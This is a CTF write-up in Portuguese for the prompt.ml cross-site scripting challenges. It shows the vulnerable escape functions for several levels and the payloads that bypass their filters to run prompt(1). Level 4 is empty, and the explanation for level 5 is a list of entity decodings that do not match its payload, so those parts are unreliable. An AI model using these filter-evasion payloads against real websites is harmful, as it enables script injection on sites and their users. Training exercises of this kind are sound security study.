# Cross-site scripting (XSS) 
###### Solved by @Mayaracar2
> This is a CTF about JavaScript analysis, xss script
## Desafio: Prompt.ml
### Sobre o desafio:
O prompt.ml é uma série de desafios de XSS (Cross-Site Scripting) organizada em níveis, cada um apresentando uma função escape() diferente que impõe filtros específicos na entrada do usuário, e tem como objetivo explorar vulnerabilidades para conseguir rodar código JavaScript, usando o prompt(1) como prova de que o XSS foi bem sucedido.
- [Página do desafio](https://prompt.ml/0)
  
## Soluções:
### Fase 0
Este é o código dado:

```bash
 function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}        
```
Este código é uma função que tem como objetivo criar uma string HTML contendo um elemento de input, porém o input é inserido diretamente no HTML sem escapar caracteres perigosos como `>`, `<script>`, entre outros, o que permite que um atacante quebre o atributo `value` e injete código arbitrário.

Para explorarmos essa vulnerabilidade usaremos:

```bash
"><script>prompt(1)</script>`
```

Por que funciona?

-Fecha o atributo value usando `>`, escapando do contexto onde o conteúdo deveria ser tratado apenas como texto.

-Em seguida, ele insere uma tag `<script>`, que o navegador reconhece e executa como código JavaScript, visto que a função não realiza nenhum filtro ou escape dos caracteres especiais (<, >, "), o navegador interpreta a injeção como parte do HTML, em vez de simples texto, permitindo a execução do script malicioso.

### Fase 1
Este é o código dado:

```bash
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}         
```
Neste código, a função recebe um input e remove todas as tags HTML usando uma expressão regular (stripTagsRE).

Para explorarmos essa vulnerabilidade usaremos:

```bash
<svg/onload=prompt(1)
```

Por que funciona?

`<svg/`: A regex falha em detectá-lo como tag devido à sua sintaxe incomum, porém passa "ileso".

`onload=prompt(1)`: Atributo de evento JavaScript que é disparado, executando o prompt(1).

### Fase 2
Este é o código dado:

```bash
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}        
```

Nesse código, tem uma função de escape que remove caracteres específicos como `(=` e `()` de uma string de entrada.

Para explorarmos essa vulnerabilidade usaremos:

```bash
<svg><script>prompt&#40;1)</script>
```

Por que funciona?

`<svg>`: Utilizado como uma "camuflagem", na qual a tag é permitida pelo navegador, ativando o modo SVG e dentro dele, é possivel rodar o <script> normalmente.

`prompt&#40;1)`: O `&#40;` é decodificado pelo navegador como ( , com base no  [HTML entities](https://www.freeformatter.com/html-entities.html).

### Fase 3
Este é o código dado:

```bash
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}        
```
Nesse código, a função de escape adiciona o input dentro de um comentário HTML, evitando a execução de scripts maliciosos, substituindo `->`por `_`.

Para explorarmos essa vulnerabilidade usaremos:

```bash
--!><svg onload=prompt(1)
```

Por que funciona?

`--!>`: Como o código não aceita ->, é preciso fechar o comentário para depois o payload ser executado.

### Fase 4
Este é o código dado:

```bash

       
```
Para explorarmos essa vulnerabilidade usaremos:

```bash

```

Por que funciona?

### Fase 5
Este é o código dado:

```bash
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}            
```
Este código, impede de gerar tags devido o bloqueio do `>`, bloqueia também qualquer atributo de evento como o anload=, onclick=, onerror=, devido o `on.+?`, além de bloquear a palavra `focus`.

Para explorarmos essa vulnerabilidade usaremos:

```bash
"type=image src onerror
="prompt(1)
```

Por que funciona?


&#112; → p

&#114; → r

&#111; → o

&#109; → m

&#112; → p

&#116; → t

&#40; → (

&#49; → 1

&#41; → )
